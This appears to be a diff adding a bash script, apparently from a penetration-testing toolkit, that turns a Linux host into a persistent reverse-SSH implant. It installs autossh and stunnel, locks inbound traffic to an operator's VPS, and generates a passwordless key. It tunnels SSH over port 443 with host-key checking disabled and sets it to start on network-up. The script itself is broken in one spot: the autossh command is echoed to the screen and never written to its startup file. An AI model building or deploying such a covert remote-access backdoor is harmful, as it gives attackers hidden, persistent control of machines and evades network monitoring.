@@ -1,0 +1,61 @@
+#!/bin/bash
+# Reverse SSH Tunnel Shell
+
+
+#-|-------------- Dependencies --------------|-
+
+read -p "[?] Install/Update dependencies? (y/n) " depen_if
+if [ $depen_if == 'y' ]; then
+        echo "[I] Checking/Installing dependencies, please wait..."
+        apt-get -qq -y install bash-completion openssh-server autossh iptables-persistent stunnel4 &>/dev/null
+        echo "[I] Dependencies installed."
+else
+        echo "[I] Skipping..."
+fi
+
+
+#-|------------- Iptables Rules -------------|-
+
+read -p "[I] Enter desired VPS ip address" vps_ip
+iptables -P FORWARD DROP
+iptables -A INPUT -m state --state INVALID -j DROP
+iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
+iptables -A INPUT -i lo -j ACCEPT
+iptables -A INPUT -s $vps_ip -j ACCEPT #accept-traffic-from-this-IP-only
+iptables -P INPUT DROP
+iptables-save > /etc/iptables/rules.v4
+echo -e "#! /bin/sh\n /sbin/iptables-restore < /etc/iptables/rules.v4" > /etc/network/if-up.d/iptables
+chmod +x /etc/network/if-up.d/iptables
+echo "[I] iptables rules set."
+
+
+#-|---------- Key Pair Generation -----------|-
+
+mkdir ~/.ssh
+chmod 700 ~/.ssh
+ssh-keygen -f ~/.ssh/id_rsa -t rsa -N ''
+chmod 600 ~/.ssh/id_rsa*
+echo "[I] Key pair has been generated at '~/.ssh/id_rsa' and '~/.ssh/id_rsa.pub'."
+
+
+#-|----------- Configure STUNNEL ------------|-
+
+echo -e "pid = /var/run/stunnel.pid\nclient=yes\n[ssh]\naccept = 443\nconnect = "$vps_ip":443" > /etc/stunnel/stunnel.conf
+if grep -iqs "ENABLED=0" /etc/default/stunnel4; then
+    sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
+fi
+echo "[I] STUNNEL has been configured."
+
+#-|----------- Configure AUTOSSH ------------|-
+
+touch /etc/network/if-up.d/autossh
+chmod +x /etc/network/if-up.d/autossh
+echo -e '#!/bin/sh\nsu -c "autossh -p 443 -f -N -R *:2222:localhost:22 root@localhost -o LogLevel=error -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no" root'
+echo "[I] AUTOSSH has been configured."
+
+
+#-|-------------- Stopping --------------|-
+
+echo "[!] WARNING: System must reboot to take effect."
+echo "[!] mitmAP module stopped."
+
